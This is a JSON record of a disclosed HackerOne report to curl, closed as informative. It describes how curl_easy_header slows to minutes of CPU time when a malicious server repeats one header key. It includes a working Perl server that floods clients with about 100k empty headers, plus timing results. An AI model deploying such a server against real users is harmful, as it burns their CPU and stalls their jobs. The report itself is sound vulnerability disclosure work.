@@ -1,0 +1,116 @@
+{
+  "id": 3133253,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTMzMjUz",
+  "url": "https://hackerone.com/reports/3133253",
+  "title": "curl_easy_header runs at O(N) or worse and can be abused to use minute(s) of CPU time",
+  "state": "Closed",
+  "substate": "informative",
+  "readable_substate": "Informative",
+  "created_at": "2025-05-07T19:25:48.502Z",
+  "submitted_at": "2025-05-07T19:25:48.642Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "wolfsage",
+    "url": "/wolfsage",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-07-01T14:07:31.146Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-06-28T12:22:18.243Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nThe implementation of curl_easy_header can be abused by a malicious server that puts all headers under a single key. Imagine a server response like:\n```\nHTTP/1.1 200 OK\na:\na:\na:\na:\n[ repeat until MAX_HTTP_RESP_HEADER_SIZE bytes are used ]\n```\n\nAs a developer, if you want to loop through the headers you do... (taken from tests/libtest/lib1940.c):\n\n```\n    if(CURLHE_OK == curl_easy_header\n                                     HEADER_REQUEST, &header)) {\n      if(header->amount > 1) {\n        /* more than one, iterate over them */\n        size_t index = 0;\n        size_t amount = header->amount;\n        do {\n          curl_mprintf(\"- %s == %s (%u/%u)\\n\", header->name, header->value,\n                       (int)index, (int)amount);\n\n          if(++index == amount)\n            break;\n          if(CURLHE_OK != curl_easy_header(easy, testdata[i], index, type,\n                                           HEADER_REQUEST, &header))\n            break;\n        } while(1);\n      }\n      else {\n        /* only one of this */\n        curl_mprintf(\" %s == %s\\n\", header->name, header->value);\n      }\n    }\n\n```\n\nEach call to curl_easy_header loops through every entry, possibly twice. First to find a count of all headers with that name, then to find the index you requested (lib/headers.c):\n```\n  /* we need a first round to count amount of this header */\n  for(e = Curl_llist_head(&data->state.httphdrs); e; e = Curl_node_next(e)) {\n    hs = Curl_node_elem(e);\n    if(strcasecompare(hs->name, name) &&\n       (hs->type & type) &&\n       (hs->request == request)) {\n      amount++;\n      pick = hs;\n      e_pick = e;\n    }\n  }\n  if(!amount)\n    return CURLHE_MISSING;\n  else if(nameindex >= amount)\n    return CURLHE_BADINDEX;\n\n  if(nameindex == amount - 1)\n    /* if the last or only occurrence is what's asked for, then we know it */\n    hs = pick;\n  else {\n    for(e = Curl_llist_head(&data->state.httphdrs); e; e = Curl_node_next(e)) {\n      hs = Curl_node_elem(e);\n      if(strcasecompare(hs->name, name) &&\n         (hs->type & type) &&\n         (hs->request == request) &&\n         (match++ == nameindex)) {\n        e_pick = e;\n        break;\n      }\n    }\n\n```\n\nThis can add up to minutes or longer depending on hardware.\n\nI did not use AI to generate this report (ugh!)\n\n## Affected version\n\nCurrently tested with git @ 283ad5c4320fa1d733e60a0dbe216ee36e3924fb\n\n[Which curl/libcurl version are you using to reproduce? On which platform? `curl -V` typically generates good output to include]\n\n```\n./src/curl -V\ncurl 8.14.0-DEV (x86_64-pc-linux-gnu) libcurl/8.14.0-DEV OpenSSL/3.0.2 zlib/1.2.11 libpsl/0.21.0\nRelease-Date: [unreleased]\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtsp smb smbs smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS HSTS HTTPS-proxy IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets\n```\n\n## Steps To Reproduce:\n\nHere's a sample perl server you can hit that generates ~300k of headers all with the key of 'a' and no value:\n```\n#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse IO::Socket qw(AF_INET AF_UNIX SOCK_STREAM SHUT_RDWR);\n\n# Just make a bunch of empty headers so we can fit as many as possible, all\n# with the same key:\n#\n# a:\n# a:\n# a:\n# a:\n# ...\n\n# Much more than this and curl complains:\n#\n#   Too large response headers: 307204 > 307200\n#\nmy $header_count = 102_390;\n\nmy $headers = join(\"\\n\", (\"a:\") x $header_count) . \"\\n\";\nmy $hlen = length($headers);\n\nprint \"Using: $hlen bytes for the header with $header_count entries\\n\\n\";\n\nmy $server = IO::Socket->new(\n  Domain    => AF_INET,\n  Type      => SOCK_STREAM,\n  Proto     => 'tcp',\n  LocalHost => '0.0.0.0',\n  LocalPort => 3333,\n  ReusePort => 1,\n  Listen => 5,\n) || die \"Can't open socket: $@\";\n\nprint \"Try http://127.0.0.1:3333\\n\\n\";\n\nwhile (1) {\n  my $client = $server->accept();\n\n  print \"Got a client\\n\";\n\n  # Read request and ignore\n  my $data = \"\";\n  $client->recv($data, 1024);\n\n  print \"Got a request: \\n\\n\" . $data =~ s/^/  /gmr;\n\n  $client->send(\"HTTP/1.1 200 OK\\r\\n\");\n\n  print \"H: $hlen\\n\";\n  while ($hlen > 0) {\n    print \"Sending a chunk of headers...\\n\";\n\n    my $sent = $client->send($headers);\n\n    unless (defined $sent) {\n      die \"  Failed to send? $!\\n\";\n    }\n\n    substr($headers, 0, $sent) = \"\";\n\n    $hlen -= $sent;\n\n    print \"  ..sent $sent bytes\\n\";\n  }\n\n  $client->send(\"\\nhi.\\n\");\n\n  $client->shutdown(SHUT_RDWR);\n\n  print \"Responded\\n\\n\";\n\n  # Reset these each time through\n  $headers = join(\"\\n\", (\"a:\") x $header_count) . \"\\n\";\n  $hlen = length($headers);\n}\n\n```\n\nYou can then try it with lib1940.c if you modify it like so:\n```\ndiff --git a/tests/libtest/lib1940.c b/tests/libtest/lib1940.c\nindex 16e288029..9efb0934d 100644\n--- a/tests/libtest/lib1940.c\n+++ b/tests/libtest/lib1940.c\n@@ -27,7 +27,7 @@\n #include \"memdebug.h\"\n \n static const char *testdata[]={\n-  \"daTE\",\n+  \"a\",\n   \"Server\",\n   \"content-type\",\n   \"content-length\",\n```\n\n```\n$ time ./lib1940 http://localhost:3333 >/dev/null\n[...]\nTest ended with result 0\n\nreal\t0m51.830s\nuser\t0m51.580s\nsys\t0m0.214s\n```\n\nThis also means curl itself is affected for anyone using `--write-out '%{header_json%}':`\n```\n$ time ./src/curl --write-out '%{header_json}' http://localhost:3333 >/dev/null\n[...]\nreal\t1m28.856s\nuser\t1m28.702s\nsys\t0m0.116s\n\n```\n\n## Impact\n\n## Summary:\n\nIt feels to me like the impact on this one is low. You'd have to get someone to hit your server with `-write-out '%{header_json%}'` or have a library using `curl_easy_header` to iterate over all values.\n\nA single request hitting this will just use up a lot of cpu for ~minute or longer depending on hardware. Unless you can force someone to make many requests and use up a lot of CPU, the damage there seems minimal.\n\nThe bigger issue might be holding up things like cron jobs or other synchronous processes for far longer than they expect to be busy.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 9,
+  "voters": [
+    "zy9ard3",
+    "thalaivar304",
+    "2026",
+    "zerithx",
+    "awso0h1ll4",
+    "dansoappiah",
+    "bilalhacker302",
+    "ryel",
+    "oleh_durasov"
+  ],
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
